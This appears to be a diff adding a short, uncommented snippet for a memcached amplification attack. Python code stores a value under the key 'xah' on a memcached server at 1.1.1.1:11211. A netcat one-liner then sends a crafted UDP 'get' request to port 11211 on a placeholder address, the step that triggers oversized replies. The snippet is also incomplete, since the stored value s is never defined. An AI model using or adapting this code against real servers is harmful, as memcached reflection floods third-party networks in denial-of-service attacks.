@@ -1,0 +1,7 @@
+
+    import memcache
+    mc = memcache.Client(['1.1.1.1:11211'],debug=True) 
+    mc.set('xah',s,90000)
+    
+    
+    python -c "print '\0\0x1\0\0\0\0x1\0\0get xah\r\n'"|nc -nvvu x.x.x.x 11211
